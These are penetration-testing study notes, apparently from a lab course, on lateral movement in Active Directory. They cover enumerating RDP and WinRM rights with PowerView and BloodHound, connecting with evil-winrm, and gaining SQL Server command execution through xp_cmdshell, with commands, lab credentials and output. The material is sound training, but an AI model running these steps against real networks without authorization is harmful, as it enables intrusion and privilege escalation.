- [Extras](#extras)
  - [Privileged Access](#privileged-access)
    - [RDP](#rdp)
      - [Enumerating the Remote Desktop Users Group](#enumerating-the-remote-desktop-users-group)
      - [Checking Remote Access Rights](#checking-remote-access-rights)
    - [WinRM](#winrm)
      - [Enumerating the Remote Management Users Group](#enumerating-the-remote-management-users-group)
      - [Using the Cypher Query in BloodHound](#using-the-cypher-query-in-bloodhound)
      - [Establishing WinRM Session from Windows](#establishing-winrm-session-from-windows)
      - [Connecting to a Target with Evil-WinRM](#connecting-to-a-target-with-evil-winrm)
    - [SQL Server Admin](#sql-server-admin)
      - [Using a Custom Cypher Query](#using-a-custom-cypher-query)
      - [Enumerating MSSQL with PowerUpSQL](#enumerating-mssql-with-powerupsql)
      - [mssqlclient.py](#mssqlclientpy)

---

# Extras

## Privileged Access

Once you gain a foothold in the domain, your goal shifts to advancing your position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways you can move laterally. Typically, if you take over an account with local admin rights over a host, or set of hosts, you can perform a PtH attack to authenticate via the SMB protocol.

### RDP

Typically, if you have control of a local admin user on a given machine, you will be able to access it via RDP. Sometimes, you will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to you as you could use the host position to:

- launch further attacks
- you may be able to escalate privileges and obtain credentials for a higher privileged user
- you may be able to pillage the host for sensitive data or credentials

#### Enumerating the Remote Desktop Users Group

Using PowerView, you could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host.

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

From the information above, you can see that all Domain Users can RDP to this host. It is common to see this on Remote Desktop Services hosts or hosts used as jump hosts. This type of server could be heavily used, and you could potentially find sensitive data that could be used to further your access, or you may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing to check in BloodHound:

"Does the Domain Users group have local admin rights or execution rights over one or more hosts?"

![ad extras 1](../../../../images/ad_extras1.png)

#### Checking Remote Access Rights

If you gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, you can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.

![ad extras 2](../../../../images/ad_extras2.png)

You could also check the Analysis tab and run the pre-built queries "Find Workstations where Domain Users can RDP" or "Find Server where Domain Users can RDP". There are other ways to enumerate this information, but BloodHound is a powerful tool that can help you narrow down these types of access rights quickly and accurately, which is hugely beneficial to you as pentesters under time constraints for the assessment period.

### WinRM

Like RDP, you may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that you could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further your access. You can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8 / Windows Server 2012 to enable WinRM access without granting local admin rights.

#### Enumerating the Remote Management Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

#### Using the Cypher Query in BloodHound

You can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![ad extras 3](../../../../images/ad_extras3.png)

You could also add this query as a custom query to your BloodHound installation, so it's always available to you.

![ad extras 4](../../../../images/ad_extras4.png)

#### Establishing WinRM Session from Windows

You can use the Enter-PSSession cmdlet using PowerShell from a Windows host.

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

#### Connecting to a Target with Evil-WinRM

From your Linux attack host, you can use the tool evil-winrm to connect.

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

### SQL Server Admin

More often than not, you will encounter SQL servers in the environments you face. It is common to find users and service accounts set up with sysadmin privileges on a given SQL server instance. You may obtain credentials for an account with this access via Kerberoasting or other such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.

#### Using a Custom Cypher Query

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. You can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

You can use your ACL rights to authenticate, change the password and then authenticate with the target using a tool such as [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).

#### Enumerating MSSQL with PowerUpSQL

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

You could then authenticate against the remote SQL server host and run custom queries or OS commands.

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

#### mssqlclient.py

You can also authenticate from your Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

```bash
d41y@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Once connected, you could type ```help``` to see what commands are available to you.

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

You could then choose ```enable_xp_cmdshell``` to enable the xp_cmdshell stored procedure which allows for one to execute OS commands via the database if the account in question has the proper access rights.

```bash
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Finally, you can run commands in the format ```xp_cmdshell <command>```. Here you can enumerate the rights that your user has on the system and see that you have SeImpersonatePrivilege, which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward your goal.

```bash
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL
```